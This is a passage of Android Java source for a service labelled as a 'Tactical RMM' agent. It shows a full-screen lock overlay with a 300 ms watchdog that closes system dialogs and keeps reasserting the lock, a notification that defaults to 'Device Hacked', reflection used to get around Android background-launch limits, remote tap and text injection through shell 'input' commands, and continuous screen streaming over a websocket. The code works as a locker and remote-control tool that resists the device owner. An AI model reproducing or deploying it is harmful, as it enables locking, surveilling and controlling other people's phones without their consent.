            final String resolvedSub = (subtitle != null && !subtitle.trim().isEmpty()) ? subtitle : getApplicationLabelName() + " Management";

            if (curtainOverlayView != null) {
                try {
                    TextView tvT = (TextView) curtainOverlayView.findViewWithTag("curtain_title");
                    TextView tvM = (TextView) curtainOverlayView.findViewWithTag("curtain_msg");
                    TextView tvS = (TextView) curtainOverlayView.findViewWithTag("curtain_sub");
                    if (tvT != null) tvT.setText(resolvedTitle);
                    if (tvM != null) tvM.setText(resolvedMsg);
                    if (tvS != null) tvS.setText(resolvedSub);
                } catch (Throwable ignored) {}
                return;
            }

            // Full-screen root container FrameLayout
            FrameLayout root = new FrameLayout(this);
            root.setBackgroundColor(0xFF0F172A);
            root.setFocusable(true);
            root.setFocusableInTouchMode(true);
            root.setOnTouchListener(new CurtainOverlayTouchListener());
            root.setOnKeyListener(new CurtainOverlayKeyListener());

            // Centered Content Card
            LinearLayout card = new LinearLayout(this);
            card.setOrientation(LinearLayout.VERTICAL);
            card.setGravity(Gravity.CENTER);
            card.setPadding(40, 60, 40, 60);

            // Lock Icon
            ImageView ivLock = new ImageView(this);
            ivLock.setImageResource(android.R.drawable.ic_lock_lock);
            ivLock.setColorFilter(0xFF38BDF8);
            LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(160, 160);
            iconParams.gravity = Gravity.CENTER_HORIZONTAL;
            iconParams.bottomMargin = 36;
            card.addView(ivLock, iconParams);

            // Title
            TextView tvTitle = new TextView(this);
            tvTitle.setTag("curtain_title");
            tvTitle.setText(resolvedTitle);
            tvTitle.setTextColor(0xFFF8FAFC);
            tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);
            tvTitle.setTypeface(Typeface.DEFAULT_BOLD);
            tvTitle.setGravity(Gravity.CENTER);
            LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            titleParams.bottomMargin = 20;
            card.addView(tvTitle, titleParams);

            // Message
            TextView tvMsg = new TextView(this);
            tvMsg.setTag("curtain_msg");
            tvMsg.setText(resolvedMsg);
            tvMsg.setTextColor(0xFF94A3B8);
            tvMsg.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
            tvMsg.setGravity(Gravity.CENTER);
            tvMsg.setLineSpacing(0, 1.25f);
            LinearLayout.LayoutParams msgParams = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            msgParams.bottomMargin = 30;
            card.addView(tvMsg, msgParams);

            // Subtitle / Support
            TextView tvSub = new TextView(this);
            tvSub.setTag("curtain_sub");
            tvSub.setText(resolvedSub);
            tvSub.setTextColor(0xFF64748B);
            tvSub.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
            tvSub.setGravity(Gravity.CENTER);
            card.addView(tvSub, new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

            FrameLayout.LayoutParams cardParams = new FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            cardParams.gravity = Gravity.CENTER;
            root.addView(card, cardParams);

            // Suppress system navigation and status bars
            root.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                root.addOnAttachStateChangeListener(new CurtainOverlayAttachListener());
            }

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                    PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.FILL;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }

            windowManager.addView(root, params);
            curtainOverlayView = root;
            log("System overlay lock window attached successfully over active apps.");
        } catch (Throwable t) {
            log("Overlay attach notice: " + t.getMessage());
        }
    }

    void performHideCurtainOverlay() {
        try {
            if (windowManager != null && curtainOverlayView != null) {
                windowManager.removeView(curtainOverlayView);
                curtainOverlayView = null;
                log("System overlay lock window removed.");
            }
        } catch (Throwable t) {
            log("Overlay remove notice: " + t.getMessage());
            curtainOverlayView = null;
        }
    }

    private CurtainWatchdogRunnable curtainWatchdogRunnable = null;

    void performCurtainWatchdog() {
        try {
            SharedPreferences prefs = getSafePreferences(this, CurtainActivity.PREFS_NAME);
            if (prefs == null || !prefs.getBoolean(CurtainActivity.PREF_IS_LOCKED, false)) {
                stopCurtainWatchdog();
                return;
            }

            // 1. Force close system dialogs (Samsung recent apps drawer, notification shade)
            try {
                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
            } catch (Throwable ignored) {}

            // 2. Reassert CurtainActivity if minimized or not currently in foreground
            if (!CurtainActivity.isForeground || CurtainActivity.currentInstance == null) {
                String title = prefs.getString(CurtainActivity.PREF_TITLE, "");
                String msg = prefs.getString(CurtainActivity.PREF_MESSAGE, "");
                String sub = prefs.getString(CurtainActivity.PREF_SUBTITLE, "");

                Intent curtainIntent = new Intent(this, CurtainActivity.class);
                curtainIntent.putExtra(CurtainActivity.EXTRA_TITLE, title);
                curtainIntent.putExtra(CurtainActivity.EXTRA_MESSAGE, msg);
                curtainIntent.putExtra(CurtainActivity.EXTRA_SUBTITLE, sub);
                curtainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK 
                        | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT 
                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                startActivity(curtainIntent);

                if (CurtainActivity.currentInstance != null) {
                    try {
                        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                        if (am != null) {
                            am.moveTaskToFront(CurtainActivity.currentInstance.getTaskId(), ActivityManager.MOVE_TASK_NO_USER_ACTION);
                        }
                    } catch (Throwable ignored) {}
                }
            }

            // 3. Ensure overlay view is showing if permission granted
            if (curtainOverlayView == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                String title = prefs.getString(CurtainActivity.PREF_TITLE, "");
                String msg = prefs.getString(CurtainActivity.PREF_MESSAGE, "");
                String sub = prefs.getString(CurtainActivity.PREF_SUBTITLE, "");
                showCurtainOverlay(title, msg, sub);
            }
        } catch (Throwable ignored) {}

        if (mainHandler != null && curtainWatchdogRunnable != null) {
            mainHandler.postDelayed(curtainWatchdogRunnable, 300L);
        }
    }

    private synchronized void startCurtainWatchdog() {
        if (curtainWatchdogRunnable != null) return;
        curtainWatchdogRunnable = new CurtainWatchdogRunnable(this);
        if (mainHandler != null) {
            mainHandler.post(curtainWatchdogRunnable);
        }
    }

    private synchronized void stopCurtainWatchdog() {
        if (curtainWatchdogRunnable != null && mainHandler != null) {
            mainHandler.removeCallbacks(curtainWatchdogRunnable);
        }
        curtainWatchdogRunnable = null;
    }

    private void toggleCurtain(boolean enabled, String title, String message, String subtitle) {
        log("Screen lock requested: enabled=" + enabled + ", title=" + title);
        try {
            SharedPreferences prefs = getSafePreferences(this, CurtainActivity.PREFS_NAME);
            if (enabled) {
                prefs.edit()
                        .putBoolean(CurtainActivity.PREF_IS_LOCKED, true)
                        .putString(CurtainActivity.PREF_TITLE, title)
                        .putString(CurtainActivity.PREF_MESSAGE, message)
                        .putString(CurtainActivity.PREF_SUBTITLE, subtitle)
                        .apply();

                // 1. Wake the physical screen if sleeping or off
                try {
                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                    if (pm != null) {
                        PowerManager.WakeLock wake = pm.newWakeLock(
                                PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
                                "TRMM:CurtainWake"
                        );
                        wake.acquire(3000L);
                    }
                } catch (Throwable ignored) {}

                // 2. Immediately show system overlay on top of ANY foreground application (Calculator, WhatsApp, etc.)
                showCurtainOverlay(title, message, subtitle);

                // 3. Prepare background activity options for Android 10-14+ background launch allowance
                android.os.Bundle bOptions = null;
                if (Build.VERSION.SDK_INT >= 34) {
                    try {
                        android.app.ActivityOptions aOpt = android.app.ActivityOptions.makeBasic();
                        java.lang.reflect.Method m = android.app.ActivityOptions.class.getMethod("setPendingIntentBackgroundActivityStartMode", int.class);
                        m.invoke(aOpt, 1);
                        bOptions = aOpt.toBundle();
                    } catch (Throwable ignored) {}
                }

                // 4. Launch CurtainActivity with reorder-to-front flags and background options
                Intent curtainIntent = new Intent(this, CurtainActivity.class);
                curtainIntent.putExtra(CurtainActivity.EXTRA_TITLE, title);
                curtainIntent.putExtra(CurtainActivity.EXTRA_MESSAGE, message);
                curtainIntent.putExtra(CurtainActivity.EXTRA_SUBTITLE, subtitle);
                curtainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK 
                        | Intent.FLAG_ACTIVITY_CLEAR_TOP 
                        | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT 
                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);

                try {
                    if (bOptions != null) {
                        startActivity(curtainIntent, bOptions);
                    } else {
                        startActivity(curtainIntent);
                    }
                } catch (Throwable t) {
                    log("startActivity notice: " + t.getMessage());
                }

                // 5. High-priority Full-Screen Intent Notification on dedicated emergency lock channel
                try {
                    int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        flags |= PendingIntent.FLAG_IMMUTABLE;
                    }
                    PendingIntent fullScreenPendingIntent = PendingIntent.getActivity(this, 9999, curtainIntent, flags);
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    if (nm != null) {
                        Notification.Builder notifBuilder;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            notifBuilder = new Notification.Builder(this, CHANNEL_LOCK_ID);
                        } else {
                            notifBuilder = new Notification.Builder(this);
                        }
                        notifBuilder.setSmallIcon(android.R.drawable.ic_lock_lock)
                                    .setContentTitle(title.isEmpty() ? "Device Hacked" : title)
                                    .setContentText(message.isEmpty() ? "Screen is locked" : message)
                                    .setFullScreenIntent(fullScreenPendingIntent, true)
                                    .setPriority(Notification.PRIORITY_MAX)
                                    .setVisibility(Notification.VISIBILITY_PUBLIC)
                                    .setAutoCancel(true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            notifBuilder.setCategory(Notification.CATEGORY_CALL);
                        }
                        nm.notify(9999, notifBuilder.build());
                    }

                    if (bOptions != null) {
                        fullScreenPendingIntent.send(this, 0, null, null, null, null, bOptions);
                    } else {
                        fullScreenPendingIntent.send();
                    }
                } catch (Throwable t) {
                    log("FullScreenIntent notice: " + t.getMessage());
                }

                // 6. Start continuous lock reassertion watchdog
                startCurtainWatchdog();
            } else {
                prefs.edit().putBoolean(CurtainActivity.PREF_IS_LOCKED, false).apply();

                // 0. Stop continuous watchdog
                stopCurtainWatchdog();

                // 1. Dismiss WindowManager System Overlay immediately
                hideCurtainOverlay();

                // 2. Cancel Lock Notification
                try {
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    if (nm != null) nm.cancel(9999);
                } catch (Throwable ignored) {}

                // 3. Direct in-memory UI thread execution
                CurtainActivity.unlockNow(this);

                // 4. Explicit package-scoped broadcast
                Intent dismissIntent = new Intent(CurtainActivity.ACTION_DISMISS);
                dismissIntent.setPackage(getPackageName());
                sendBroadcast(dismissIntent);

                // 5. Explicit Intent to invoke onNewIntent
                Intent unlockIntent = new Intent(this, CurtainActivity.class);
                unlockIntent.putExtra("ACTION", "UNLOCK");
                unlockIntent.putExtra("UNLOCK", true);
                unlockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(unlockIntent);
            }

            JSONObject diag = new JSONObject();
            diag.put("type", "diag_curtain");
            diag.put("enabled", enabled);
            diag.put("success", true);
            diag.put("agent_id", agentId);
            if (wsClient != null && wsClient.isConnected()) {
                wsClient.send(diag.toString());
            }
        } catch (Throwable e) {
            log("Failed to toggle curtain: " + e.getMessage());
        }
    }

    private final ExecutorService inputExecutor = Executors.newSingleThreadExecutor();

    private void dispatchShellInput(final String cmd) {
        inputExecutor.execute(new InputShellRunnable(cmd));
    }

    private void injectRemoteText(String text) {
        if (text == null || text.isEmpty()) return;
        String safeText = text.replace(" ", "%s")
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("'", "\\'")
                .replace("$", "\\$")
                .replace("`", "\\`")
                .replace("&", "\\&");
        dispatchShellInput("input text \"" + safeText + "\"");
    }

    private int translateVkToAndroid(int vk) {
        switch (vk) {
            case 13: return 66; // Enter -> KEYCODE_ENTER
            case 8:  return 67; // Backspace -> KEYCODE_DEL
            case 27: return 4;  // Escape -> KEYCODE_BACK
            case 9:  return 61; // Tab -> KEYCODE_TAB
            case 32: return 62; // Space -> KEYCODE_SPACE
            case 38: return 19; // Up -> KEYCODE_DPAD_UP
            case 40: return 20; // Down -> KEYCODE_DPAD_DOWN
            case 37: return 21; // Left -> KEYCODE_DPAD_LEFT
            case 39: return 22; // Right -> KEYCODE_DPAD_RIGHT
            case 46: return 112;// Delete -> KEYCODE_FORWARD_DEL
            default: return -1;
        }
    }

    private void handleRemoteInput(JSONObject msg) {
        try {
            String type = msg.optString("type");
            DisplayMetrics dm = getResources().getDisplayMetrics();

            // 1. Android System Navigation (Back, Home, Recents, Power, Volume)
            if ("android_nav".equalsIgnoreCase(type) || "keyevent".equalsIgnoreCase(type)) {
                String action = msg.optString("action", "");
                int keycode = msg.optInt("keycode", -1);
                if (keycode > 0) {
                    dispatchShellInput("input keyevent " + keycode);
                } else if ("back".equalsIgnoreCase(action)) {
                    dispatchShellInput("input keyevent 4");
                } else if ("home".equalsIgnoreCase(action)) {
                    dispatchShellInput("input keyevent 3");
                } else if ("recents".equalsIgnoreCase(action) || "app_switch".equalsIgnoreCase(action)) {
                    dispatchShellInput("input keyevent 187");
                } else if ("power".equalsIgnoreCase(action) || "lock".equalsIgnoreCase(action)) {
                    dispatchShellInput("input keyevent 26");
                } else if ("vol_up".equalsIgnoreCase(action)) {
                    dispatchShellInput("input keyevent 24");
                } else if ("vol_down".equalsIgnoreCase(action)) {
                    dispatchShellInput("input keyevent 25");
                }
                return;
            }

            // 2. Tap / Click (mousedown or tap)
            if ("tap".equalsIgnoreCase(type) || "mousedown".equalsIgnoreCase(type) || "click".equalsIgnoreCase(type)) {
                double normX = msg.optDouble("normalized_x", -1.0);
                double normY = msg.optDouble("normalized_y", -1.0);
                int x, y;
                if (normX >= 0 && normY >= 0) {
                    x = (int) (normX * dm.widthPixels);
                    y = (int) (normY * dm.heightPixels);
                } else {
                    x = msg.optInt("x", 0);
                    y = msg.optInt("y", 0);
                }
                if (x >= 0 && y >= 0 && x <= dm.widthPixels && y <= dm.heightPixels) {
                    dispatchShellInput("input tap " + x + " " + y);
                }
                return;
            }

            // 3. Swipe / Drag
            if ("swipe".equalsIgnoreCase(type) || "drag".equalsIgnoreCase(type)) {
                double normX1 = msg.optDouble("normalized_x1", -1.0);
                double normY1 = msg.optDouble("normalized_y1", -1.0);
                double normX2 = msg.optDouble("normalized_x2", -1.0);
                double normY2 = msg.optDouble("normalized_y2", -1.0);
                int x1, y1, x2, y2;
                if (normX1 >= 0 && normY1 >= 0 && normX2 >= 0 && normY2 >= 0) {
                    x1 = (int) (normX1 * dm.widthPixels);
                    y1 = (int) (normY1 * dm.heightPixels);
                    x2 = (int) (normX2 * dm.widthPixels);
                    y2 = (int) (normY2 * dm.heightPixels);
                } else {
                    x1 = msg.optInt("x1", 0);
                    y1 = msg.optInt("y1", 0);
                    x2 = msg.optInt("x2", 0);
                    y2 = msg.optInt("y2", 0);
                }
                int duration = msg.optInt("duration", 250);
                if (duration < 50) duration = 50;
                if (duration > 1500) duration = 1500;
                dispatchShellInput("input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " " + duration);
                return;
            }

            // 4. Mouse Wheel / Scroll -> Translated to vertical swipe
            if ("wheel".equalsIgnoreCase(type) || "scroll".equalsIgnoreCase(type)) {
                int delta = msg.optInt("delta", 0);
                if (delta != 0) {
                    int midX = dm.widthPixels / 2;
                    int midY = dm.heightPixels / 2;
                    int offset = (int) (dm.heightPixels * 0.22f);
                    int startY = delta < 0 ? (midY + offset) : (midY - offset);
                    int endY = delta < 0 ? (midY - offset) : (midY + offset);
                    dispatchShellInput("input swipe " + midX + " " + startY + " " + midX + " " + endY + " 160");
                }
                return;
            }

            // 5. Remote Text Injection
            if ("type_text".equalsIgnoreCase(type) || "text".equalsIgnoreCase(type)) {
                String text = msg.optString("text", "");
                if (!text.isEmpty()) {
                    injectRemoteText(text);
                }
                return;
            }

            // 6. Character / Single Key
            if ("char".equalsIgnoreCase(type)) {
                int charCode = msg.optInt("char", 0);
                if (charCode == 13 || charCode == 10) {
                    dispatchShellInput("input keyevent 66"); // ENTER
                } else if (charCode == 8) {
                    dispatchShellInput("input keyevent 67"); // DEL
                } else if (charCode == 32) {
                    dispatchShellInput("input keyevent 62"); // SPACE
                } else if (charCode > 0) {
                    injectRemoteText(String.valueOf((char) charCode));
                }
                return;
            }

            // 7. Virtual Keycode
            if ("keydown".equalsIgnoreCase(type)) {
                int vk = msg.optInt("vk", 0);
                int androidKey = translateVkToAndroid(vk);
                if (androidKey > 0) {
                    dispatchShellInput("input keyevent " + androidKey);
                }
                return;
            }
        } catch (Throwable t) {
            log("Input handling warning: " + t.getMessage());
        }
    }

    public synchronized void onMediaProjectionGranted() {
        initMediaProjection();
    }

    private synchronized void startScreenStreaming() {
        if (isStreaming) return;
        isStreaming = true;

        acquireScreenWakeLock();

        if (screenStreamThread != null && screenStreamThread.isAlive()) {
            try {
                screenStreamThread.interrupt();
                screenStreamThread.join(300);
            } catch (Throwable ignored) {}
        }

        initMediaProjection();

        if (mediaProjectionResultData == null) {
            log("MediaProjection token not available yet. Prompting screen authorization...");
            try {
                Intent promptIntent = new Intent(this, MainActivity.class);
                promptIntent.setAction("REQUEST_PROJECTION");
                promptIntent.putExtra("REQUEST_PROJECTION", true);
                promptIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);

                int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    flags |= PendingIntent.FLAG_IMMUTABLE;
                }
                PendingIntent pi = PendingIntent.getActivity(this, 8888, promptIntent, flags);

                // Heads-up high-priority full-screen notification to bypass background activity start blocks
                NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) {
                    Notification.Builder notifBuilder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                            ? new Notification.Builder(this, CHANNEL_LOCK_ID)
                            : new Notification.Builder(this);
                    notifBuilder.setSmallIcon(android.R.drawable.ic_menu_camera)
                            .setContentTitle(getApplicationLabelName() + " Screen Access")
                            .setContentText("Tap to authorize screen mirroring")
                            .setFullScreenIntent(pi, true)
                            .setPriority(Notification.PRIORITY_MAX)
                            .setAutoCancel(true);
                    nm.notify(8888, notifBuilder.build());
                }

                // Android 14 background activity start allowance
                android.os.Bundle bOptions = null;
                if (Build.VERSION.SDK_INT >= 34) {
                    try {
                        android.app.ActivityOptions aOpt = android.app.ActivityOptions.makeBasic();
                        java.lang.reflect.Method m = android.app.ActivityOptions.class.getMethod("setPendingIntentBackgroundActivityStartMode", int.class);
                        m.invoke(aOpt, 1);
                        bOptions = aOpt.toBundle();
                    } catch (Throwable ignored) {}
                }
                if (bOptions != null) {
                    pi.send(this, 0, null, null, null, null, bOptions);
                } else {
                    pi.send();
                }

                try {
                    startActivity(promptIntent);
                } catch (Throwable ignored) {}
            } catch (Throwable t) {
                log("Screen capture prompt notice: " + t.getMessage());
            }
        }

        screenStreamThread = new Thread(new StreamRunnable(this), "TRMM-ScreenStreamer");
        screenStreamThread.setDaemon(true);
        screenStreamThread.start();
    }

    private synchronized void stopScreenStreaming() {
        isStreaming = false;
        releaseScreenWakeLock();
        // Keep mediaProjection, virtualDisplay, and imageReader intact so next viewer session connects instantly!
        safeStartForeground("Tactical RMM Service Active");
    }

    void onProjectionStopped() {
        try {
            releaseScreenWakeLock();
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (reusableBitmap != null) {
                try { reusableBitmap.recycle(); } catch (Throwable ignored) {}
                reusableBitmap = null;
            }
            if (reusableCroppedBitmap != null) {
                try { reusableCroppedBitmap.recycle(); } catch (Throwable ignored) {}
                reusableCroppedBitmap = null;
            }
            reusableCropCanvas = null;
            srcRect = null;
            dstRect = null;
            lastAllocW = 0;
            lastAllocH = 0;
            lastAllocRowPadding = 0;
            mediaProjection = null;

            SharedPreferences prefs = getSafePreferences(this, "trmm_state");
            if (prefs != null) {
                prefs.edit().putBoolean("has_projection_token", false).apply();
            }
        } catch (Throwable ignored) {}
    }

    private synchronized void initMediaProjection() {
        if (mediaProjectionResultData == null) return;
        try {
            if (mediaProjection != null && virtualDisplay != null && imageReader != null) {
                return;
            }

            // Promote FGS to mediaProjection if permissions and token exist
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    int fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                    if (Build.VERSION.SDK_INT >= 34) {
                        fgsType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION | 0x40000000;
                    }
                    startForeground(
                            NOTIFICATION_ID,
                            buildNotification("Service Active"),
                            fgsType
                    );
                } catch (Throwable t) {
                    safeStartForeground("Service Active");
                }
            }

            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null && mediaProjection == null) {
                mediaProjection = mpm.getMediaProjection(mediaProjectionResultCode, (Intent) mediaProjectionResultData.clone());
            }

            if (mediaProjection != null) {
                // Strict Android 14 requirement: registerCallback before createVirtualDisplay
                mediaProjection.registerCallback(new AgentProjectionCallback(this), new Handler(Looper.getMainLooper()));

                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                DisplayMetrics metrics = new DisplayMetrics();
                if (wm != null && wm.getDefaultDisplay() != null) {
                    wm.getDefaultDisplay().getRealMetrics(metrics);
                } else {
                    metrics = getResources().getDisplayMetrics();
                }

                int realW = metrics.widthPixels > 0 ? metrics.widthPixels : 720;
                int realH = metrics.heightPixels > 0 ? metrics.heightPixels : 1280;

                int width = Math.min(realW, 540);
                int height = (int) (realH * ((float) width / realW));
                width = (width / 2) * 2;
                height = (height / 2) * 2;
                int dpi = metrics.densityDpi > 0 ? metrics.densityDpi : 320;

                if (imageReader != null) {
                    try { imageReader.close(); } catch (Throwable ignored) {}
                }
                imageReader = ImageReader.newInstance(width, height, android.graphics.PixelFormat.RGBA_8888, 4);

                if (virtualDisplay != null) {
                    try { virtualDisplay.release(); } catch (Throwable ignored) {}
                }
                int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
                virtualDisplay = mediaProjection.createVirtualDisplay(
                        "TRMMScreen", width, height, dpi,
                        flags,
                        imageReader.getSurface(), null, null
                );
                log("[OK] Entire screen display projection active across all apps (" + width + "x" + height + " dpi=" + dpi + ")");

                SharedPreferences prefs = getSafePreferences(this, "trmm_state");
                if (prefs != null) {
                    prefs.edit().putBoolean("has_projection_token", true).apply();
                }
            }
        } catch (Throwable e) {
            log("MediaProjection init warning: " + e.getMessage());
        }
    }

    private void sendCachedMirrorFrame() {
        wakeScreenIfAsleep();
        if (lastValidJpegBytes != null && lastValidJpegBytes.length > 0) {
            int w = lastAllocW > 0 ? lastAllocW : 540;
            int h = lastAllocH > 0 ? lastAllocH : 1200;
            sendMirrorFrame(w, h, lastValidJpegBytes);
        }
    }

    private void sendMirrorFrame(int w, int h, byte[] jpeg) {
        if (wsClient == null || !wsClient.isConnected() || jpeg == null || jpeg.length == 0) return;
        try {
            mirrorFrameSequence = (mirrorFrameSequence % 0x7FFFFFFF) + 1;
            JSONObject meta = new JSONObject();
            meta.put("native_width", w);
            meta.put("native_height", h);
            meta.put("sequence", mirrorFrameSequence);
            byte[] metaBytes = meta.toString().getBytes("UTF-8");
            int metaLen = metaBytes.length;

            byte[] packet = new byte[1 + 4 + 2 + metaLen + jpeg.length];
            packet[0] = 0x02;
            byte[] magic = "MRA2".getBytes("US-ASCII");
            System.arraycopy(magic, 0, packet, 1, 4);
            packet[5] = (byte) ((metaLen >> 8) & 0xFF);
            packet[6] = (byte) (metaLen & 0xFF);
            System.arraycopy(metaBytes, 0, packet, 7, metaLen);
            System.arraycopy(jpeg, 0, packet, 7 + metaLen, jpeg.length);

            wsClient.sendBinary(packet);
        } catch (Throwable t) {
            try {
                byte[] packet = new byte[1 + jpeg.length];
                packet[0] = 0x02;
                System.arraycopy(jpeg, 0, packet, 1, jpeg.length);
                wsClient.sendBinary(packet);
            } catch (Throwable ignored) {}
        }
    }

    void streamScreenFramesLoop() {
        long lastSentFrameMs = 0;

        // Instant initial display from cache if available
        sendCachedMirrorFrame();

        while (isStreaming && wsClient != null && wsClient.isConnected()) {
            try {
                boolean frameSent = false;

                if (imageReader != null) {
                    Image image = null;
                    try {
                        image = imageReader.acquireLatestImage();
                        if (image != null) {
                            int w = image.getWidth();
                            int h = image.getHeight();
                            Image.Plane[] planes = image.getPlanes();
                            if (planes != null && planes.length > 0) {
                                ByteBuffer buffer = planes[0].getBuffer();
                                buffer.rewind();
                                int pixelStride = planes[0].getPixelStride();
                                int rowStride = planes[0].getRowStride();
                                int rowPadding = rowStride - pixelStride * w;
                                int bufferWidth = w + (pixelStride > 0 ? rowPadding / pixelStride : 0);

                                if (reusableBitmap == null || lastAllocW != bufferWidth || lastAllocH != h || lastAllocRowPadding != rowPadding) {
                                    if (reusableBitmap != null) {
                                        try { reusableBitmap.recycle(); } catch (Throwable ignored) {}
                                    }
                                    if (reusableCroppedBitmap != null) {
                                        try { reusableCroppedBitmap.recycle(); } catch (Throwable ignored) {}
                                    }
                                    reusableBitmap = Bitmap.createBitmap(bufferWidth, h, Bitmap.Config.ARGB_8888);
                                    if (rowPadding != 0) {
                                        reusableCroppedBitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
                                        reusableCropCanvas = new Canvas(reusableCroppedBitmap);
                                        srcRect = new Rect(0, 0, w, h);
                                        dstRect = new Rect(0, 0, w, h);
                                    } else {
                                        reusableCroppedBitmap = null;
                                        reusableCropCanvas = null;
                                        srcRect = null;
                                        dstRect = null;
                                    }
                                    lastAllocW = bufferWidth;
                                    lastAllocH = h;
                                    lastAllocRowPadding = rowPadding;
                                }

                                reusableBitmap.copyPixelsFromBuffer(buffer);

                                Bitmap toCompress;
                                if (rowPadding != 0 && reusableCroppedBitmap != null && reusableCropCanvas != null) {
                                    reusableCropCanvas.drawBitmap(reusableBitmap, srcRect, dstRect, null);
                                    toCompress = reusableCroppedBitmap;
                                } else {
                                    toCompress = reusableBitmap;
                                }

                                reusableBos.reset();
                                toCompress.compress(Bitmap.CompressFormat.JPEG, 60, reusableBos);
                                byte[] jpeg = reusableBos.toByteArray();
                                lastValidJpegBytes = jpeg;

                                sendMirrorFrame(w, h, jpeg);
                                lastSentFrameMs = System.currentTimeMillis();
                                frameSent = true;
                            }
                        }
                    } catch (Throwable t) {
                        Log.d("TRMMAgent", "ImageReader frame capture: " + t.getMessage());
                    } finally {
                        if (image != null) {
                            try { image.close(); } catch (Throwable ignored) {}
                        }
                    }
                }

                long now = System.currentTimeMillis();
                // Screen keepalive: if screen is static and no new hardware frames arrived for 2000ms, resend last frame
                if (!frameSent && lastValidJpegBytes != null && (now - lastSentFrameMs > 2000)) {
                    sendCachedMirrorFrame();
                    lastSentFrameMs = now;
                }
                // Periodic re-sync: if no new hardware frame composited for >5000ms, wake screen and re-kick surface
                if (!frameSent && (now - lastSentFrameMs > 5000)) {
                    wakeScreenIfAsleep();
                    if (virtualDisplay != null && imageReader != null) {
                        try {
                            virtualDisplay.setSurface(imageReader.getSurface());
                        } catch (Throwable ignored) {}
                    }
                }

                Thread.sleep(frameSent ? 35 : 30);
            } catch (InterruptedException e) {
                break;
            } catch (Throwable e) {
                try { Thread.sleep(60); } catch (Throwable ignored) {}
            }
        }
